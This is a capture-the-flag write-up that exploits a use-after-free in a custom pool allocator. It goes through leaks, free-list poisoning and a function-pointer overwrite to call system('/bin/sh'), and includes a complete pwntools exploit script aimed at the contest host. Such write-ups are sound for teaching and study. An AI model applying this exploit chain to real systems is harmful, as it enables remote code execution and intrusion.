# PWN#003 — UAF on a safe-linked pool allocator

**Flag:** `CTF{0b1578aa1b39f4c6ab9a857a657ee71aKABO....!}`  
**Service:** `nc 169.58.126.107 5002`  
**Flag format:** `CTF{}`

| Artifact | Bytes | SHA-256 |
|---|---:|---|
| `notes` (handout) | 17,064 | `a7d66c7e2b5a2892444e33135e95351c3cd4aba2268f41050ad0069f298fffc3` |

## Challenge

> Get a shell on the remote host and read the flag.

The service is a small "Notes Vault" menu: add, free, edit and view up to eight notes. Every
connection starts with a banner that leaks an address:

```text
=== Notes Vault ===
[debug] build id: 0x55ebac004af8
1) Add  2) Free  3) Edit  4) View  5) Exit
>
```

The handout is a non-stripped x86-64 PIE with a hand-written pool allocator for note contents.
The container runs it as `nobody` from `/challenge` and the flag is at `/flag/flag.txt`.

## Analysis

### Protections and layout

`readelf -d` shows `BIND_NOW` plus `FLAGS_1: NOW PIE`, so the binary is a PIE with Full RELRO;
`size_to_class` saves `fs:0x28` into its frame, i.e. a stack canary is present. NX is on. No
seccomp filter is in play — the exploit's `system()` runs `/bin/sh` and normal coreutils commands
without any syscall being refused.

The binary keeps everything in `.bss`, which makes the whole state reachable from a single
arbitrary write:

| Symbol | Address | Role |
|---|---|---|
| `class_sizes` | `0x2010` | `0x20`, `0x40`, `0x80` — the three pool size classes |
| `notes` | `0x4060` | 8-entry array of note pointers |
| `pool` | `0x40a0` | arena base |
| `pool_cursor` | `0x40a8` | arena bump pointer |
| `freelist` | `0x40b0` | per-class free-list heads |
| `notes_storage` | `0x40e0` | 8 note structs, 24 bytes each (`0x40e0` + `0xc0` = `_end` = `0x41a0`) |

Each note struct is three qwords. The order below is what the exploit payloads assume and what
the bytes leaked back from a live process confirm (`'C'*8`, then the content pointer, then the
size, then `default_formatter`):

| Offset | Field |
|---:|---|
| `0x00` | `formatter` — function pointer invoked by `view_note` |
| `0x08` | `ptr` — content buffer |
| `0x10` | `size` — length used by edit/view |

### Free PIE leak

`main` prints `printf("[debug] build id: %p\n", &main)` before the first prompt, so the PIE slide
is free:

```text
base = 0x55ebac004af8 - 0x1af8 = 0x55ebac003000
```

`main` sits at `0x1af8`, `default_formatter` at `0x1512`, and `notes_storage` at `0x40e0`; all of
them are directly addressable from the leak.

### The UAF

`free_note` calls `content_free()` on the content buffer but never writes `NULL` back into
`notes[idx]`. The slot keeps pointing at the (now free) content chunk, and `edit`/`view` keep
using the stale `ptr`/`size`. That is a plain use-after-free on a 0x20-class chunk, and it is the
only bug needed.

### view_note does `call rdx`

`view_note` loads the note struct, moves `note->formatter` into `rdx`, moves `note->ptr` into
`rdi`, and performs an indirect `call rdx` — a `default_formatter`-style callback that prints the
buffer. Controlling one note struct therefore gives both control flow (`rdx`) and the first
argument (`rdi`). With `formatter = system` and `ptr = "/bin/sh"`, `view` *is* `system("/bin/sh")`.

### The pool allocator and its leak oracle

`palloc` serves 0x20/0x40/0x80 requests from the per-class free lists, backed by the single arena
tracked by `pool`/`pool_cursor`. `pfree` pushes the chunk onto the list of its class and stores a
safe-linked next pointer in the first qword of the chunk:

```text
mangle(next, chunk) = next ^ rol(chunk, 13)
```

When the list is empty, `next` is `NULL` and the qword written at offset 0 of the freed chunk is
simply `rol(chunk, 13)`. Because the slot still points at that chunk, `view` reads the mangled
word straight back and a single `ror` recovers the chunk address — a free heap/pool leak:

```text
raw = 0000020643ebba0a0000...   ->  ror(raw, 13) = 0x55d75a183010
```

## Solution

### 1. Leak the PIE base

Parse the banner (`connect()` in the script below): `base = leaked_main - 0x1af8`.

### 2. Leak a pool chunk

`add(0, 0x20)` then `free(0)`, then `view(0)`: the first qword of the freed chunk is
`rol(P0, 13)`. `P0 = ror(value, 13)` is 16-byte aligned (observed `0x55d75a183010`).

### 3. Point the free list at `.bss` (the two-add trick)

`edit(0, p64(slot0 ^ rol(P0, 13)))` rewrites the free-list link through the UAF, so the head
becomes `slot0 = base + 0x40e0` (`&notes_storage[0]`).

The note structs themselves live in `.bss`, so each `add` consumes exactly one 0x20-class chunk
for the content. Two adds are enough:

```python
add(io, 1, 0x20, b'/bin/sh\x00')   # pops P0, installs head = &notes_storage[0]
add(io, 2, 0x20, <32 bytes>)       # pops &notes_storage[0]; read() writes into slot 0's struct
```

The 32 bytes written by the second `add` are
`p64(default_formatter) + p64(&notes_storage[1]) + p64(0x40) + b'C'*8`, so slot 0 is rebuilt as
`{default_formatter, &notes_storage[1], 0x40}`. Slot 0 now behaves as an editor for slot 1:
`edit(0)` writes 0x40 bytes at `&notes_storage[1]`, and `view(0)` prints slot 1's struct.

The trailing `'C'*8` is what overwrites slot 1's `formatter` with `CCCCCCCC`; the leak of slot 1
confirms the layout:

```text
4343434343434343 10a09705b2550000 2000000000000000 127571dfb1550000
'C' * 8          P0               0x20             default_formatter
```

### 4. Arbitrary read / write

`set_slot1` writes `{default_formatter, addr, 0x40, 40 filler}` into slot 1's struct; `view(1)`
then returns 0x20 bytes from any address. The same write primitive can put anything into slot 1's
`formatter`/`ptr`.

### 5. libc base from the GOT

`free@GOT` is at `0x3f88`. Reading it gives `free = libc + 0xa6240`:

```text
free = 0x7f77c2720240  libc_base = 0x7f77c267a000
```

The full symbol set (free/puts/write/printf/read/strtol/malloc/exit/setvbuf/
`__libc_start_main`/`__stack_chk_fail`) matched exactly one entry on libc.rip:

```json
{ "id": "libc6_2.42-13_amd64",
  "md5": "30fb6243b858286a539e86a67bf48cfa",
  "sha256": "60e497ccae98697a7aa6299c2c1cc4c248a6fb901341d1a2ac0da6f7485e2f27",
  "symbols": { "system": "0x54790", "str_bin_sh": "0x1aaea4", "free": "0xa6240" } }
```

`md5sum /challenge/libc.so.6` on the target returned the same `30fb6243b858286a539e86a67bf48cfa`,
so the offsets are exact. `/bin/sh` is not needed from libc — the string is already staged in the
pool chunk `P0` by step 3.

### 6. Turn slot 1 into `system("/bin/sh")`

`set_slot1(io, base, libc_base + 0x54790, P0)` makes slot 1 `{system, P0, 0x40}`. `view(1)`
performs `call rdx` with `rdi = P0`, i.e. `system("/bin/sh")`. The whole chain runs inside one
connection because the PIE and libc slides change per connection.

## Exploit code

```python
#!/usr/bin/env python3
# PWN#003 -- Africa battleCTF 2026 Qualifier
# notes: free PIE leak -> UAF on the safe-linked pool freelist -> .bss note struct
#        -> arbitrary read of .got -> slot 1 = {system, "/bin/sh"}
import time
from pwn import *

HOST, PORT = '169.58.126.107', 5002

OFF_MAIN = 0x1af8
OFF_DEFAULT_FORMATTER = 0x1512
NOTES_STORAGE = 0x40e0
GOT = 0x3f70
FREELIST = 0x40b0
FREE_OFF = 0xa6240
SYSTEM_OFF = 0x54790          # libc6_2.42-13_amd64 (unique libc.rip match)

MASK = (1 << 64) - 1


def rol(v, n):
    v &= MASK
    return ((v << n) | (v >> (64 - n))) & MASK


def ror(v, n):
    return rol(v, 64 - n)


def connect():
    io = remote(HOST, PORT, timeout=20)
    io.recvuntil(b'build id: 0x')
    main_addr = int(io.recvuntil(b'\n', drop=True), 16)
    base = main_addr - OFF_MAIN
    return io, base


def menu(io, c):
    io.recvuntil(b'> ')
    io.sendline(str(c).encode())


def add(io, idx, size, content):
    menu(io, 1)
    io.recvuntil(b'Index (0-7): ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'Size: ')
    io.sendline(str(size).encode())
    io.recvuntil(b'Content: ')
    io.send(content)
    return io.recvuntil(b'.')


def free_(io, idx):
    menu(io, 2)
    io.recvuntil(b'Index: ')
    io.sendline(str(idx).encode())
    return io.recvuntil(b'.')


def edit(io, idx, data):
    menu(io, 3)
    io.recvuntil(b'Index: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'Content: ')
    io.send(data)
    return io.recvuntil(b'.')


def view(io, idx, n=0x20):
    menu(io, 4)
    io.recvuntil(b'Index: ')
    io.sendline(str(idx).encode())
    io.recvuntil(b'Note: ')
    return io.recvn(n)


def leak_pool(io, base):
    add(io, 0, 0x20, b'A' * 8)
    free_(io, 0)
    raw = view(io, 0)
    val = u64(raw[:8])
    return ror(val, 13), raw


def slot(base, i):
    return base + NOTES_STORAGE + 24 * i


def set_slot1(io, base, formatter, ptr, size=0x40, pad=8):
    edit(io, 0, p64(formatter) + p64(ptr) + p64(size) + b'C' * pad)


def arb_read(io, base, addr):
    set_slot1(io, base, base + OFF_DEFAULT_FORMATTER, addr, pad=40)
    menu(io, 4)
    io.recvuntil(b'Index: ')
    io.sendline(b'1')
    io.recvuntil(b'Note: ')
    return io.recvn(0x20, timeout=10)


def run(io, cmds, wait=1.2):
    for c in cmds:
        io.sendline(c.encode() if isinstance(c, str) else c)
    time.sleep(wait)
    out = b''
    try:
        while True:
            b = io.recv(timeout=2)
            if not b:
                break
            out += b
    except Exception:
        pass
    return out.decode('latin1')


def fresh(cmds):
    io, base = connect()
    add(io, 0, 0x20, b'X' * 8)
    free_(io, 0)
    P0 = ror(u64(view(io, 0)[:8]), 13)
    edit(io, 0, p64(slot(base, 0) ^ rol(P0, 13)))
    add(io, 1, 0x20, b'/bin/sh\x00')
    add(io, 2, 0x20, p64(base + OFF_DEFAULT_FORMATTER) + p64(slot(base, 1)) + p64(0x40) + b'C' * 8)
    free_addr = u64(arb_read(io, base, base + 0x3f88)[:8])
    libc_base = free_addr - FREE_OFF
    set_slot1(io, base, libc_base + SYSTEM_OFF, P0)
    menu(io, 4)
    io.recvuntil(b'Index: ')
    io.sendline(b'1')
    io.recv(timeout=3)
    return io


if __name__ == '__main__':
    io = fresh([])
    print(run(io, ['cat /flag/flag.txt'], wait=1.5))
    io.close()
```

## Notes

* Everything must happen in a single connection. Both the PIE base and the libc base change per
  connection, so a leak from one session is useless in the next.
* Only three of the eight slots are used (`0`, `1`, `2`). The `0x40`-byte edit of slot 0 spills
  past slot 1 into `notes_storage[2]` and `[3]`; those slots stay unused, so the collateral is
  harmless.
* The 8 filler bytes at the end of the `add(2)` payload land on slot 1's `formatter` and turn it
  into `'CCCCCCCC'`. That is why `view(0)` starts with eight `0x43` bytes and why `set_slot1` has
  to rewrite the formatter every time.
* `remote` in pwntools has no `.sleep()` method; the helper uses `time.sleep()` instead.
* The flag is also exported as `FLAG` in the container's environment, and `/flag` is a tmpfs
  mount. `/flag/flag.txt` is readable as `nobody`, so no privilege escalation is needed.
* The container copy of the binary at `/challenge/notes` is 21,864 bytes, while the handout used
  for analysis is 17,064 bytes. Every offset in this writeup (`0x1af8`, `0x40e0`, `0x3f88`, the
  24-byte struct stride) comes from the handout and matched the live service.
* The libc is Debian glibc 2.42-13: `free = libc + 0xa6240`, `system = libc + 0x54790`,
  `__libc_start_main = libc + 0x29fa0`. Using a host glibc with a different `main_arena` layout
  will break the `free@GOT` offset.
